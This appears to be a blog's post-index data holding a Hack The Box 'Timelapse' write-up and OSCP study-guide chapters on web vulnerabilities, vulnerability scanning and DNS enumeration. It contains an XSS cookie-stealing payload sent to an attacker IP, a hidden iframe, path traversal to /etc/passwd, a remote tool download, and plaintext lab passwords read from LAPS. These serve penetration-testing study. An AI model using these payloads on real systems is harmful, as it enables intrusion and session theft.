AQoCggEBAKVWB6NiFkce4vNNI61hcc6LnrNKhyv2ibznhgO7/qocFrg1/zEU/og0 12 │ 0E2Vha8DEK8ozxpCwem/e2inClD5htFkO7U3HKG9801NFeN0VBX2ciIqSjA63qAb 13 │ YX707mBUXg8Ccc+b5hg/CxuhGRhXxA6nMiLo0xmAMImuAhJZmZQepOHJsVb/s86Z 14 │ 7WCzq2I3VcWg+7XM05hogvd21lprNdwvDoilMlE8kBYa22rIWiaZismoLMJJpa72 15 │ MbSnWEoruaTrC8FJHxB8dbapf341ssp6AK37+MBrq7ZX2W74rcwLY1pLM6giLkcs 16 │ yOeu6NGgLHe/plcvQo8IXMMwSosUkfECAwEAAaN4MHYwDgYDVR0PAQH/BAQDAgWg 17 │ MBMGA1UdJQQMMAoGCCsGAQUFBwMCMDAGA1UdEQQpMCegJQYKKwYBBAGCNxQCA6AX 18 │ DBVsZWdhY3l5QHRpbWVsYXBzZS5odGIwHQYDVR0OBBYEFMzZDuSvIJ6wdSv9gZYe 19 │ rC2xJVgZMA0GCSqGSIb3DQEBCwUAA4IBAQBfjvt2v94+/pb92nLIS4rna7CIKrqa 20 │ m966H8kF6t7pHZPlEDZMr17u50kvTN1D4PtlCud9SaPsokSbKNoFgX1KNX5m72F0 21 │ 3KCLImh1z4ltxsc6JgOgncCqdFfX3t0Ey3R7KGx6reLtvU4FZ+nhvlXTeJ/PAXc/ 22 │ fwa2rfiPsfV51WTOYEzcgpngdHJtBqmuNw3tnEKmgMqp65KYzpKTvvM1JjhI5txG 23 │ hqbdWbn2lS4wjGy3YGRZw6oM667GF13Vq2X3WHZK5NaP+5Kawd/J+Ms6riY0PDbh 24 │ nx143vIioHYMiGCnKsHdWiMrG2UWLOoeUrlUmpr069kY/nn7+zSEa2pA 25 │ -----END CERTIFICATE-----───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────Obtaining the User FlagI got stuck here for quite a long time. After googling a bit I saw that windows winrm runs on port 5985 and I didn’t scan all ports when doing my nmap. I decided to run my nmap again with the -p- option and I saw that this service was running with ssl:5986/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_ssl-date: 2022-07-05T20:40:19+00:00; +7h59m58s from scanner time.| ssl-cert: Subject: commonName=dc01.timelapse.htb| Not valid before: 2021-10-25T14:05:29|_Not valid after: 2022-10-25T14:25:29| tls-alpn: |_ http/1.1|_http-title: Not Found|_http-server-header: Microsoft-HTTPAPI/2.0Then I used evil-winrm to log in using this key and cert files and I was able to obtain the user flag at the user Desktop:ruby /home/adri/Desktop/adri/utils/evil-winrm/evil-winrm.rb -S -i 10.10.11.152 -c cert.pem -k key.pemEvil-WinRM shell v3.4Warning: SSL enabledInfo: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\legacyy\\Documents&gt; whoamitimelapse\\legacyyPrivilege EscalationTo start with the privilege escalation I created an http server using python at the same location as winPEASx64.exe and, inside the windows machine, I uploaded the executable using the Invoke-WebRequest cmdlet (IWR) using my IP inside the VPN:*Evil-WinRM* PS C:\\Users\\legacyy\\Documents&gt; IWR http://10.10.14.63:8000/winPEASx64.exe -OutFile winPEASx64.exeAfter executing it, I saw that there was a Powershell command history located at C:\\Users\\legacyy\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt:ÉÍÍÍÍÍÍÍÍÍÍ¹ PowerShell Settings PowerShell v2 Version: 2.0 PowerShell v5 Version: 5.1.17763.1 PowerShell Core Version: Transcription Settings: Module Logging Settings: Scriptblock Logging Settings: PS history file: C:\\Users\\legacyy\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt PS history size: 434BIf we check the history file we can see some interesting commands that involve a password that we can see when $p is defined.*Evil-WinRM* PS C:\\Users\\legacyy\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine&gt; cat \"C:/Users/legacyy/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt\"whoamiipconfig /allnetstat -ano |select-string LIST$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}get-aduser -filter * -properties *exitI tried to log on using that account and password without succeeding. However, as we can see in the history files, we can repeat the commands and execute as the svc_deploy user by invoking commands. I decided to check the differences between the legacyy user and the svc_deploy user and I saw that the last one has the privilege to read the LAPS. Since we found some information about LAPS before, I decided to follow that path.*Evil-WinRM* PS C:\\Users\\legacyy\\Documents&gt; net user svc_deployUser name svc_deployFull Name svc_deployCommentUser's commentCountry/region code 000 (System Default)Account active YesAccount expires NeverPassword last set 10/25/2021 12:12:37 PMPassword expires NeverPassword changeable 10/26/2021 12:12:37 PMPassword required YesUser may change password YesWorkstations allowed AllLogon scriptUser profileHome directoryLast logon 7/6/2022 7:15:13 PMLogon hours allowed AllLocal Group Memberships *Remote Management UseGlobal Group memberships *LAPS_Readers *Domain UsersThe command completed successfully.After some googling I tried to use the Get-AdmPassword using the computer name of the host (which you can get using the hostname command) but it didn’t worked:*Evil-WinRM* PS C:\\Users\\legacyy\\Documents&gt; invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {Get-AdmPwdPassword -ComputerName dc01}The term 'Get-AdmPwdPassword' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again. + CategoryInfo : ObjectNotFound: (Get-AdmPwdPassword:String) [], CommandNotFoundException + FullyQualifiedErrorId : CommandNotFoundExceptionAfter more googling, I saw that if you have permission to read the LAPS, you can see the password by checking the Computer attributes because LAPS adds a new attribute named ms-Mcs-AdmPwd with the password. After running this command and checking the output, I was able to find an admin password (3i92{K87u45/SPb&amp;63OUm9nL):*Evil-WinRM* PS C:\\Users\\legacyy\\Documents&gt; invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {Get-ADComputer -LDAPFilter \"(name=*DC01*)\" -Properties *}PSComputerName : localhostRunspaceId : 316249f0-9ceb-44c6-9e35-7d1bd3f63c3fAccountExpirationDate :accountExpires : 9223372036854775807AccountLockoutTime :AccountNotDelegated : FalseAllowReversiblePasswordEncryption : FalseAuthenticationPolicy : {}AuthenticationPolicySilo : {}BadLogonCount : 0badPasswordTime : 0badPwdCount : 0CannotChangePassword : FalseCanonicalName : timelapse.htb/Domain Controllers/DC01Certificates : {}CN : DC01codePage : 0CompoundIdentitySupported : {False}countryCode : 0Created : 10/23/2021 11:40:55 AMcreateTimeStamp : 10/23/2021 11:40:55 AMDeleted :Description :DisplayName :DistinguishedName : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htbDNSHostName : dc01.timelapse.htbDoesNotRequirePreAuth : FalsedSCorePropagationData : {10/25/2021 9:03:33 AM, 10/25/2021 9:03:33 AM, 10/23/2021 11:40:55 AM, 1/1/1601 10:16:33 AM}Enabled : TrueHomedirRequired : FalseHomePage :instanceType : 4IPv4Address : 10.10.11.152IPv6Address : dead:beef::20disCriticalSystemObject : TrueisDeleted :KerberosEncryptionType : {RC4, AES128, AES256}LastBadPasswordAttempt :LastKnownParent :lastLogoff : 0lastLogon : 133016279609409837LastLogonDate : 7/6/2022 5:38:38 PMlastLogonTimestamp : 133016279187691001localPolicyFlags : 0Location :LockedOut : FalselogonCount : 138ManagedBy :MemberOf : {}MNSLogonAccount : FalseModified : 7/6/2022 5:39:05 PMmodifyTimeStamp : 7/6/2022 5:39:05 PMms-Mcs-AdmPwd : 3i92{K87u45/SPb&amp;63OUm9nLms-Mcs-AdmPwdExpirationTime : 133020599453159751msDFSR-ComputerReferenceBL : {CN=DC01,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=timelapse,DC=htb}msDS-GenerationId : {209, 176, 121, 109...}msDS-SupportedEncryptionTypes : 28msDS-User-Account-Control-Computed : 0Then I used these credentials to log on as a Local Admin and retrieve the root flag:ruby /home/adri/Desktop/adri/utils/evil-winrm/evil-winrm.rb -u Administrator -p 'i{dQA#a.I7Zx,CW!74NUAm63' -i 10.10.11.152 -SEvil-WinRM shell v3.4Warning: SSL enabledInfo: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; cd ..I had to search for the root flag using the dir command." }, { "title": "OSCP-9: Web-based Vulnerabilities", "url": "/posts/OSCP-9/", "categories": "OSCP-Study-Guide", "tags": "OSCP", "date": "2022-08-11 08:10:00 +0200", "snippet": "Chapter 9: Web-based VulnerabilitiesIn this chapter we will explain how to identify and exploit the most important web-based vulnerabilities. I won’t enter into a super deep explanation of all vulnerabilities. I am considering writing individual posts with more detail about the most important attacks in the future, but here only the top of the iceberg will be covered.Admin ConsolesIs usual to find some admin consoles behind some directory of the url like /admin.We can use a tool like gobuster with the -dir option to Brute Force a webpage searching for common directories using a wordlist. My wordlist recommendation is the raft-medium-directiries-lowercase. We can also use dirbusterLets asume that we have used gobuster and it has found a sucpicious directory with a name like /phpmyadmin.Usually, this consoles are protected with a username/password login. Some software has default credentials like admin/admin, admin/root, /, etc. If it is a well known software, in this case php, we could search for the default credentials and try them, we could have luck and gain access with them.However, in most cases the default credentials won’t work. Then we will have to try a brute force attack. We could use hydra or create our own script.Sometimes won’t be just bruteforcing the username and password. Is it possible that the webpage has a token or cookies that must be used. I recommend to use Burp Suite to analyze how is the request being made.If a token defined in the html is used, I reccomend to create your own script with python or bash, but you can also use the Burp Suite Intruder method. If you want to try a set of passwords for one username, you can use the Sniper type of attack. However, if you need to change different fiels for each attempt, you will need to use a Pitchfork attack.Values like a token or cookie have to bee extracted from the html, you can do this wit Burp using a Recursive Grep payload (Grep - Extract). There you can define an expression that will indicate the starting of the value, and the expression that will define the end of the value. For the username/password, you can use a Simple list (wordlist).Cross-Site Scripting (XSS)An XSS Vulnerability allows an attacker to inject input that is displayed on a web page and it gets executed. This happens when the input is not correctly sanitized.There are three types of XSS variants: stored, reflected and DOM-based.Stored XSS attacksThey occur whrn the input that the attacker send is stored in a database or cache and it persist there. When the server uses the infected value, and serves the web-page to any user, it will be victim of the exploit. They tend to appear at websites that have a comment section or forums.Reflected XSS attacksThis type of XSS attack usually have the malicious code in the same link/URL. The web application uses this value defined in the url and displays it inside the web page, being executed. The victim will be the user interacting with that link.DOM-based XSS attacksThey take place solely within the page’s DOM (Document Object Model) and the payload is executed as a result of modifying the DOM in the victim’s browser. It usually happens when when JavaScript takes data from teh attacker and adds it to a skin that supports dynamic code execution, like eval()or innerHTML.While DOM-based XSS occurs by processing data from an untrusted source by writing data to a potentially dangerous sink within the DOM, reflected XSS occurs when an application obtains data in an HTTP request and includes that data within the immediate response in an unsafe way. Thus, this is the main difference between DOM based XSS and reflected XSS.When you are searching for XSS entry points, you want to search for search fields which don’t sanitize the input displayed as output in subsequent pages. Once we have the vulnerable point identified, we can start testing special input to see if the return is unfiltered.Dangerous characters are: &lt; &gt; ' \" { } ;. If this characters are not removed, the web app may be vulnerable.We may take into consideration HTML encoding and URL encoding. If we are able to inject &lt; &gt; and our input is injected inside a div, we would need to inject the &lt;script&gt; tag before adding the malicious code.Here you can find a huge list of different payloads. Note that not all of them will work. You must identify your situation and search for the best payload.XSS can be used to deliver client-side attacks since they allow the redirection of the victim’s browser to a location that the attacker may control. The attacker could inject an iframe where the src points to the IP controlled by the attacker. THe iframe can look like this in order to be invisible: &lt;iframe src=http://10.11.12.13/test height=\"0\" width=\"0\"&gt;&lt;/iframe&gt;. When any user enters to that page, the browser will request for the “test” resource and the attacker could gather information about the victim.However, XSS are more used for stealing cookies and session information when the app uses an insecure session management (When the cookies doesn’t have the SOecure and HttpOnly flag). \t- The Secure flag tells the browser to only send the cookie over encrypted connections (SSL connections). \t- The HttpOnly doesn’t allow JavaScript to access to the cookie. If this flag is not set, using XSS we could retrieve cookies.Lets create a payload example:&lt;scritp&gt; new Image().src=\"http://10.11.12.13/test.jpg?cookie=\"+document.cookie;&lt;/sctipt&gt;The document.cookie will retrieve the cookies that the victim is using and they will be sent along with the GET request. Then, the attacker will be able to see the cookie when the GET request is recieved. The attacker can use this cookie to hijack the session of the victim.Directory/Path Traversal VulnerabilitiesThis vulnerability allows the attacker to gain unauthorized access to files that are not supposed to be accessed through the web app. This vuln also occurs when the input is not validated, so the attacker can manipulate paths using ../.Usually, this vulnerability is exploited to obtain sensitive information, but in some situations it can lead to file inclusions in specific directories ond overwritte config files.If we want to identify this vulnerability, we should search for file references and modify them to see if they are treated as we want.For example, if the URL looks like this: https://examplesite.com/file.php?file=login, we can try to modify the file value with some path traversal payloads, for example ../../../../../../../../etc/passwd (we add several “../” to make sure we set the root (/) directory as the current one, and then go to “/etc/passwd”). In the next image you can see this vulnerability beeing exploit in the DamnVulnerableWebApplication" }, { "title": "OSCP-8: Vulnerability Scanning", "url": "/posts/OSCP-8/", "categories": "OSCP-Study-Guide", "tags": "OSCP", "date": "2022-07-26 08:10:00 +0200", "snippet": "Chapter 8: Vulnerability ScanningVulnerability Scanning is the process of detecting a known exploit/vulnerability when analyzing a victim. There are automated tools that do this process. They scan all the ports and identify the OS and services running, then, using techniques such as banner grabbing, they try to identify the version of those services and macth them with the signature of the known vulnerabilities. However, is common to have false positives and false negatives using these tools.NessusNessus is one of the most used automatic vulnerability scanners. It was an open source project, but the source was closed. In consequence, some forks of the original source became open source under the name of OpenVAS (or Greenbone). However, Nessus has a free version which we will use to run an automated scan.Installing NessusWe can install the corresponding package here. In my case I am going to use the .deb.❯ sudo dpkg -i Nessus-10.3.0-debian9_amd64.debSelecting previously unselected package nessus.(Reading database ... 0 files and directories currently installed.)Preparing to unpack Nessus-10.3.0-debian9_amd64.deb ...Unpacking nessus (10.3.0) ...Setting up nessus (10.3.0) ...Unpacking Nessus Scanner Core Components.../var/lib/dpkg/info/nessus.postinst: line 34: deb-systemd-helper: command not found/var/lib/dpkg/info/nessus.postinst: line 37: deb-systemd-helper: command not found/var/lib/dpkg/info/nessus.postinst: line 44: deb-systemd-helper: command not found - You can start Nessus Scanner by typing /bin/systemctl start nessusd.service - Then go to https://FreeRaidr:8834/ to configure your scannerAs the output says, we can start the service doing sudo systemctl start nessusd.service:❯ sudo systemctl start nessusd.service❯ sudo systemctl status nessusd.service● nessusd.service - The Nessus Vulnerability Scanner Loaded: loaded (/usr/lib/systemd/system/nessusd.service; disabled; preset: disabled) Active: active (running) since Tue 2022-07-26 08:56:23 UTC; 8s ago Main PID: 145862 (nessus-service) Tasks: 14 (limit: 7664) Memory: 114.9M CPU: 7.260s CGroup: /system.slice/nessusd.service ├─145862 /opt/nessus/sbin/nessus-service -q └─145863 nessusd -qJul 26 08:56:23 FreeRaidr systemd[1]: Started The Nessus Vulnerability Scanner.Jul 26 08:56:24 FreeRaidr nessus-service[145863]: Cached 0 plugin libs in 0msecJul 26 08:56:24 FreeRaidr nessus-service[145863]: Cached 0 plugin libs in 0msecNow we can open our browser and go to https://localhost:8834. When trying to access this web page, we will have an error indicating an unknown certificate issuer, because its SSL certificate is self-signed. Since we know it is not a dangerous application, we will accept the risk.Next step is to choose what type of product we will be using, which will be Nessus Essentials.Now we will need to fill the required information to receive an activation code in our email. Once we have it, we will be able to activate the product and create a User Account.Once the previous steps have been done, nessus will start to download plugins.Now we will define our target. Nessus supports different types of scan such as: Basic Network Scan: Generic scan with several checks to be used against various target types. Credentialed Patch Audit: Authenticated (The scanner has access to a user) scan to enumerate missing patches. Web Application Tests: Specialized scan for discovering known web vulnerabilities. Spectre and Meltdown: Targeted scan for Spectre and Meltdown vulnerabilitiesWe are going to click New Scan and then Basic Network Scan. Now we will need to provide all the required arguments to execute the scan. I downloaded the Metasploitable VM machine to have a victim host where we can throw the scan.The Basic Network Scan comes with a predefined configuration, however, we may want to change some values. For example, the predefined configuration defines that only the common ports will be scanned, but we want to scan all of them. To change this we will go to the Discovery tab and change the value of the scan type to Custom. This will add new tabs under the discovery tab. We will go to Port Scanning and we will see several options to define how we want to do the port scan.We will first change the Port scan range and put the value 0-65535 (all ports).Now we will click the drop-down menu under the Save button and use the Launch to throw the scan.This might take some time to execute. Since the Metasploitable machine has a lot of vulnerabilities on purpose, the scan will find a lot of things to expose.Once the scan is completed, we can click on the scan name to show the results. If we click on the IP address we can see the vulnerabilities discovered in that target. We are able to filter the vulnerabilities by severity, exploitability, CVE, etc.Nessus define some groups where some related vulnerabilities are grouped, but if we want to see all the vulnerabilities on a single page, we can disable this grouping format. The example below shows all the vulnerabilities with the filtered with the Exploit Available is equal to true filter.If we want to search for more vulnerabilities inside the host, we want to provide nessus with some credentials to access it. To do this we will do another scan, but this time we are going to select Credentialed Patch AuditWe will need to provide again the IP and a name for the scan. However, now we will go to the Credentials tab and add the ssh credentials. Since I’m using the metasploitable machine, the default credentials are msfadmin:msfadmin. Since we want to use password authentication we have to select the corresponding method.Now we can launch the attack as we did in the first scan and wait for the results.Nessus PluginsBy default, Nessus enables a number of plugins when running a default scan, but we can define some other plugins to do a specific scan or search for a specific vulnerability. To do this we are going to create a New Scan but this time selecting the Advanced Scan configuration. Now we will go to the Plugins tab and we will see all the enabled plugins. We can disable them using the Disable All button.If we want to scan for a specific vulnerability, for example the NFS Exported Share Information Disclosure we will go to the RPC tab in the left column and several plugins will be displayed on the right column, where we will select the NFS Exported Share Information Disclosure, with the ID: 11356.Now we can launch the scan and wait for the results. We can see that it is vulnerable.Using NmapNmap can also scan for vulnerabilities using the Nmap Script Engine (NSE). These scripts are written in Lua. Some scripts can exploit the vulnerability and they may destroy the host, this is why the scripts are categorized as safe or intrusive.If we keep using the Metasploitable machine as an example, we can scan for vulnerabilities using: sudo nmap --script vuln 192.168.194.128This is a short extract of the huge output:❯ sudo nmap --script vuln 192.168.194.128passwd: Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-26 11:26 UTCPre-scan script results:| broadcast-avahi-dos: | Discovered hosts:| 224.0.0.251| After NULL UDP avahi packet DoS (CVE-2011-1002).|_ Hosts are all up (not vulnerable).Nmap scan report for 192.168.194.128Host is up (0.00047s latency).Not shown: 977 closed tcp ports (reset)PORT STATE SERVICE21/tcp open ftp| ftp-vsftpd-backdoor: | VULNERABLE:| vsFTPd version 2.3.4 backdoor| State: VULNERABLE (Exploitable)| IDs: BID:48539 CVE:CVE-2011-2523| vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.| Disclosure date: 2011-07-03| Exploit results:| Shell command: id| Results: uid=0(root) gid=0(root)| References:| http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html| https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb| https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523|_ https://www.securityfocus.com/bid/4853922/tcp open ssh23/tcp open telnet25/tcp open smtp|_sslv2-drown: ERROR: Script execution failed (use -d to debug)| ssl-dh-params: | VULNERABLE:| Anonymous Diffie-Hellman Key Exchange MitM Vulnerability| State: VULNERABLE| Transport Layer Security (TLS) services that use anonymous| Diffie-Hellman key exchange only provide protection against passive| eavesdropping, and are vulnerable to active man-in-the-middle attacks| which could completely compromise the confidentiality and integrity| of any data exchanged over the resulting session.| Check results:| ANONYMOUS DH GROUP 1| Cipher Suite: TLS_DH_anon_WITH_AES_128_CBC_SHA| Modulus Type: Safe prime| Modulus Source: postfix builtin| Modulus Length: 1024| Generator Length: 8| Public Key Length: 1024| References:| https://www.ietf.org/rfc/rfc2246.txt| | Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)| State: VULNERABLE| IDs: BID:74733 CVE:CVE-2015-4000| The Transport Layer Security (TLS) protocol contains a flaw that is| triggered when handling Diffie-Hellman key exchanges defined with| the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker| to downgrade the security of a TLS session to 512-bit export-grade| cryptography, which is significantly weaker, allowing the attacker| to more easily break the encryption and monitor or tamper with| the encrypted stream.| Disclosure date: 2015-5-19| Check results:| EXPORT-GRADE DH GROUP 1| Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA| Modulus Type: Safe prime| Modulus Source: Unknown/Custom-generated| Modulus Length: 512| Generator Length: 8| Public Key Length: 512| References:| https://weakdh.org| https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000| https://www.securityfocus.com/bid/74733| | Diffie-Hellman Key Exchange Insufficient Group Strength| State: VULNERABLE| Transport Layer Security (TLS) services that use Diffie-Hellman groups| of insufficient strength, especially those using one of a few commonly| shared groups, may be susceptible to passive eavesdropping attacks.| Check results:| WEAK DH GROUP 1| Cipher Suite: TLS_DHE_RSA_WITH_DES_CBC_SHA| Modulus Type: Safe prime| Modulus Source: postfix builtin| Modulus Length: 1024| Generator Length: 8| Public Key Length: 1024| References:|_ https://weakdh.org| smtp-vuln-cve2010-4344: |_ The SMTP server is not Exim: NOT VULNERABLE| ssl-poodle: | VULNERABLE:| SSL POODLE information leak| State: VULNERABLE| IDs: BID:70574 CVE:CVE-2014-3566| The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other| products, uses nondeterministic CBC padding, which makes it easier| for man-in-the-middle attackers to obtain cleartext data via a| padding-oracle attack, aka the \"POODLE\" issue.| Disclosure date: 2014-10-14| Check results:| TLS_RSA_WITH_AES_128_CBC_SHA| References:| https://www.imperialviolet.org/2014/10/14/poodle.html| https://www.openssl.org/~bodo/ssl-poodle.pdf| https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566|_ https://www.securityfocus.com/bid/7057453/tcp open domain80/tcp open http| http-enum: | /tikiwiki/: Tikiwiki| /test/: Test page| /phpinfo.php: Possible information file| /phpMyAdmin/: phpMyAdmin| /doc/: Potentially interesting directory w/ listing on 'apache/2.2.8 (ubuntu) dav/2'" }, { "title": "OSCP-7: Active Information Gathering", "url": "/posts/OSCP-7/", "categories": "OSCP-Study-Guide", "tags": "OSCP", "date": "2022-07-21 08:10:00 +0200", "snippet": "Chapter 7: Active Information GatheringIn the previous post we explored some ways to obtain information about a user without directly interacting with him, but in this post we will explore the most common ways to obtain information about a user that involve direct interaction with target services.DNS EnumerationThe Domain Name System (DNS) is a distributed database that allows the translation of domain names into IP addresses. The database follows a hierarchical structure divided into several zones, starting with the root level domain. Let’s learn how DNS works before learning how to enumerate it.The next image shows the hierarchical structure of DNS:The root Server contains the IP of the top level domain servers and they contain the addresses of second level domain servers etc.But how is this structure used?When you search for a hostname like “example.com” in your browser, the host name is sent to the OS DNS client, which is going to forward a request to the configured name server. This name server is known as a DNS recursor and is the one who will interact with the DNS structure, not your host: The recursor send the query to the root domain. The root domain answers with the address of the Top level domain (TLD). In this example the TLD will be .com. The recursor sends the query to the TLD .com. The TLD will answer with the Second level domain example.com address. The recursor will send the query to the example.com DNS server (Authoritative Name Server). An authoritative name server contains the DNS records in a local database known as a zone file. There are usually two zone files for each domain: Forward lookup zone: Translates names into IP addresses. Reverse lookup zone: Translates IP addresses into names. The authoritative name server answers with the corresponding IP address. The recursor sends the IP back to the DNS client that runs inside the host and it will be able to access to the correct host and load the webpage.To avoid doing this process everytime, browsers and name servers have a cache that stores DNS records.There are different type of DNS records that a domain can use: NS: Nameserver records contain the name of the authoritative servers that host DNS records for a domain. A: Host record contains the IP address of a hostname. MX: Mail Exchange records contain the name of the servers that handle email for that domain. PTR: Pointer Records are used in reverse lookup and they contain records associated with an IP address. CNAME: Canonical Name Records are used to create aliases for other host records. TXT: Text Records contain arbitary data that can be used for various purposes.Let’s do some practical examples:First, we will use the host command to find the IP address of www.google.com:❯ host www.google.comwww.google.com has address 142.250.201.68www.google.com has IPv6 address 2a00:1450:4003:80c::2004The host command will search for an A record unless we specify what we want. We can use the -t option to specify what kind of record we are searching for:❯ host -t mx google.comgoogle.com mail is handled by 10 smtp.google.com.Note that I searched for the MX record, but instead of the www.google.com i used the google.com domain.An important technique to obtain domain names is using brute force with wordlists. We could create a bash script that executes the host command searching for exiting subdomains. There are tools that can do this like gobuster or wfuzz.We could also do reverse lookups brute forcing the IP addresses within a network.DNS Zone TransfersA zone transfer is a database replication between related DNS servers which the zone file is copied from a master DNS server to a slave server. Theoretically, just authorized DNS servers should be able to ask for a zone transfer, but many administrators misconfigure DNS servers and anyone can reccive a copy of the DNS zone file.We can use the host command again with the -l option to ask for a zone transfer. We must provide the domain name and the DNS server address/name. Since we need a DNS server name to do the zone transfer, we can first do the host -t ns google.com to obtain the names and then try the zone transfers for each DNS server:❯ host -t ns google.comgoogle.com name server ns1.google.com.google.com name server ns3.google.com.google.com name server ns2.google.com.google.com name server ns4.google.com.❯ host -l google.com ns1.google.comUsing domain server:Name: ns1.google.comAddress: 216.239.32.10#53Aliases: ; Transfer failed.❯ host -l google.com ns2.google.comUsing domain server:Name: ns2.google.comAddress: 216.239.34.10#53Aliases: ; Transfer failed.❯ host -l google.com ns3.google.comUsing domain server:Name: ns3.google.comAddress: 216.239.36.10#53Aliases: ; Transfer failed.We can see that Google has everything properly configured and we are not allowed to do zone transfers. We could also run a script to do this automatically, but there are tools that already do this, like DNSRecon: dnsrecon -d google.com -t axfr where -d allows us to specify the domain and -t to specify the type of enumeration that we want (in this case, a zone transfer).Another tool is the DNSenum. We can run this tool against the zonetransfer.me (a domain created specifically to allow zone transfers and do tests). Here we can see part of the output:❯ dnsenum zonetransfer.meSmartmatch is experimental at /usr/bin/dnsenum line 698.Smartmatch is experimental at /usr/bin/dnsenum line 698.dnsenum.pl VERSION:1.2.4----- zonetransfer.me -----Host's addresses:__________________zonetransfer.me. 5 IN A 5.196.105.14Name Servers:______________nsztm1.digi.ninja. 5 IN A 81.4.108.41nsztm2.digi.ninja. 5 IN A 34.225.33.2Mail (MX) Servers:___________________ALT1.ASPMX.L.GOOGLE.COM. 5 IN A 142.250.153.26ASPMX2.GOOGLEMAIL.COM. 5 IN A 142.250.153.26ASPMX4.GOOGLEMAIL.COM. 5 IN A 142.250.150.27ASPMX.L.GOOGLE.COM. 5 IN A 108.177.15.27ASPMX3.GOOGLEMAIL.COM. 5 IN A 142.251.9.26ASPMX5.GOOGLEMAIL.COM. 5 IN A 74.125.200.26ALT2.ASPMX.L.GOOGLE.COM. 5 IN A 142.251.9.26Trying Zone Transfers and getting Bind Versions:_________________________________________________Trying Zone Transfer for zonetransfer.me on nsztm1.digi.ninja ... zonetransfer.me. 7200 IN SOA (zonetransfer.me. 300 IN HINFO \"Casiozonetransfer.me. 301 IN TXT (zonetransfer.me. 7200 IN MX 0zonetransfer.me. 7200 IN MX 10zonetransfer.me. 7200 IN MX 10zonetransfer.me. 7200 IN MX 20zonetransfer.me. 7200 IN MX 20zonetransfer.me. 7200 IN MX 20zonetransfer.me. 7200 IN MX 20zonetransfer.me. 7200 IN A 5.196.105.14zonetransfer.me. 7200 IN NS nsztm1.digi.ninja.zonetransfer.me. 7200 IN NS nsztm2.digi.ninja._acme-challenge.zonetransfer.me. 301 IN TXT (_sip._tcp.zonetransfer.me. 14000 IN SRV 014.105.196.5.IN-ADDR.ARPA.zonetransfer.me. 7200 IN PTR www.zonetransfer.me.asfdbauthdns.zonetransfer.me. 7900 IN AFSDB 1asfdbbox.zonetransfer.me. 7200 IN A 127.0.0.1asfdbvolume.zonetransfer.me. 7800 IN AFSDB 1canberra-office.zonetransfer.me. 7200 IN A 202.14.81.230cmdexec.zonetransfer.me. 300 IN TXT \";contact.zonetransfer.me. 2592000 IN TXT (dc-office.zonetransfer.me. 7200 IN A 143.228.181.132deadbeef.zonetransfer.me. 7201 IN AAAA dead:beaf::dr.zonetransfer.me. 300 IN LOC 53DZC.zonetransfer.me. 7200 IN TXT AbCdEfGemail.zonetransfer.me. 2222 IN NAPTR (email.zonetransfer.me. 7200 IN A 74.125.206.26Hello.zonetransfer.me. 7200 IN TXT \"Hihome.zonetransfer.me. 7200 IN A 127.0.0.1Info.zonetransfer.me. 7200 IN TXT (internal.zonetransfer.me. 300 IN NS intns1.zonetransfer.me.internal.zonetransfer.me. 300 IN NS intns2.zonetransfer.me.intns1.zonetransfer.me. 300 IN A 81.4.108.41intns2.zonetransfer.me. 300 IN A 167.88.42.94office.zonetransfer.me. 7200 IN A 4.23.39.254ipv6actnow.org.zonetransfer.me. 7200 IN AAAA 2001:67c:2e8:11::c100:1332owa.zonetransfer.me. 7200 IN A 207.46.197.32robinwood.zonetransfer.me. 302 IN TXT \"Robinrp.zonetransfer.me. 321 IN RP (sip.zonetransfer.me. 3333 IN NAPTR (sqli.zonetransfer.me. 300 IN TXT \"'sshock.zonetransfer.me. 7200 IN TXT \"()staging.zonetransfer.me. 7200 IN CNAME www.sydneyoperahouse.com.alltcpportsopen.firewall.test.zonetransfer.me. 301 IN A 127.0.0.1testing.zonetransfer.me. 301 IN CNAME www.zonetransfer.me.vpn.zonetransfer.me. 4000 IN A 174.36.59.154www.zonetransfer.me. 7200 IN A 5.196.105.14xss.zonetransfer.me. 300 IN TXT \"'&gt;&lt;script&gt;alert('Boo')&lt;/script&gt;\"Port ScanningWhen we have the IP of the hosts that we want to test, the first thing we should enumerate is their ports. Port Scanning is the process of inspecting TCP and UDP ports and detect what services are running.There are a lot of different port scanning techniques and tools. We can do it manually using netcat. Since ports may run TCP or UDP protocols, it’s important to consider it when scanning.TCP ScanningThe most used TCP scan technique is the CONNECT scanning, where the scanner host establishes a TCP connection finishing the three-way handshake that the TCP protocol defines. In this protocol, the host sends a TCP packet with the SYN flag to the destination port. If that port is open, that server sends back a packet with the SYN-ACK packet, which has the SYN flag and 